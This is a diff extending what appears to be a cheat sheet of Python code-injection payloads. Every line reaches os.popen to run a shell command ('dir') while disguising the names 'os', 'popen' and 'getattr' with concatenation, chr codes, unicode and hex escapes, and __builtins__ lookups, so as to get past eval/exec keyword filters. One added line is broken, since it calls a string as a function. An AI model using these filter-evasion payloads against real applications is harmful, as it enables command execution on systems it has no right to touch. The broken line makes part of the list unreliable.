@@ -3,4 +3,17 @@ plaintext:              getattr(__import__('os'), 'popen')('dir').read()
 string concantenation:  getattr(__import__('o'+'s'), 'popen')('dir').read()
 using join:             getattr(__import__(''.join(['o','s'])), 'popen')('dir').read()
 chr:                    getattr(__import__("".join([chr(111), chr(115)])), 'popen')("".join([chr(100), chr(105), chr(114)])).read()
-unicode:                getattr(__import__("\u006F\u0073"), 'popen')("\u0064\u0069\u0072").read()
+unicode:                getattr(__import__("\u006F\u0073"), '\u0070\u006F\u0070\u0065\u006E')("\u0064\u0069\u0072").read()
+hex: 			getattr(__import__("\x6f\x73"), 'popen')("\x64\x69\x72").read()
+building getattr dynamically: __builtins__  .__dict__['getattr'](__import__('o'+'s'), 'popen')('dir').read() 
+
+eval function (getattr blocked)
+__builtins__.__dict__[''.join([chr(c) for c in [103,101,116,97,116,116,114]])](__import__('os'), 'popen')('dir').read()
+
+
+("".join([chr(103)+chr(101)+chr(116)+chr(97)+chr(116)+chr(116)+chr(114)])(__import__("".join([chr(111), chr(115)])), 'popen')("".join([chr(100), chr(105), chr(114)])).read())
+
+
+
+exec function
+plaintext:              print(globals()['__builtins__']['__import__']('os').popen('dir').read())
